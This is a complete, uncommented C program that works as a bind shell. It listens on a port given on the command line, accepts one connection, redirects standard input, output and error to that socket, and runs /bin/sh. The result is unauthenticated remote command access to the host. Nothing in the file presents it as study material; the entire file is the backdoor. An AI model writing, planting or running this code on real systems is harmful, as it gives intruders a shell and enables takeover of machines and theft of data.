#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#define SOCKADDR    struct sockaddr
#define SOCKADDR_IN struct sockaddr_in

int main(int argc, char **argv) {

    int sockfd,connfd;
    SOCKADDR_IN servAddr = {sizeof(SOCKADDR_IN)};
    SOCKADDR_IN cliAddr = {sizeof(SOCKADDR_IN)};

    if(argc != 3 ) {

        fprintf(stderr,"usage: ./%s ip  bind_port\n",argv[0]);
        exit(0);
    }
    servAddr.sin_family = AF_INET;
    servAddr.sin_port = htons(atoi(argv[2]));
    inet_pton(AF_INET,argv[1],&servAddr.sin_addr);
    if(-1 == (sockfd = socket(AF_INET,SOCK_STREAM,0))) {

        perror("socket");
        exit(-1);
    }

    if(-1 == bind(sockfd,(SOCKADDR*)&servAddr,sizeof(servAddr))){
        perror("bind");
        exit(-1);
    }

    if(-1 == listen(sockfd,10)) {
        perror("listen");
        exit(-1);
    }
    socklen_t a;
    if(-1 == (connfd = accept(sockfd,(SOCKADDR*)&cliAddr,&a))){
        perror("accept");
        exit(0);
    }
    close(0);
    close(1);
    close(2);
    dup2(connfd,0);
    dup2(connfd,1);
    dup2(connfd,2);

    execve("/bin/sh",NULL,NULL);

    return 0;

}
